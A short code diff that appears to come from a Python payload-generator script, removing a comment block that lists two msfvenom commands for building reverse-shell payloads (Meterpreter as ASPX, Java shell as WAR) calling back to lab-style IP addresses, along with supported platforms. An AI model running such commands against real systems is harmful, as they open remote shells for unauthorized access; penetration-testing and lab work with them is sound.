@@ -80,18 +80,6 @@ pay_name =""
 command=""
 payload_used=""
 
-'''
-msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.13 lport=1234 -f aspx -o shell.aspx
-command :  msfvenom -p java/shell_reverse_tcp lhost=10.10.14.14 lport=5555 -f war -o shell2.war
-
-met : 
-linux , osx, windows
-
-rev : 
-bsd, linux , osx, windows
-
-'''
-
 def show_banner():
     global shell_type 
     global platform 
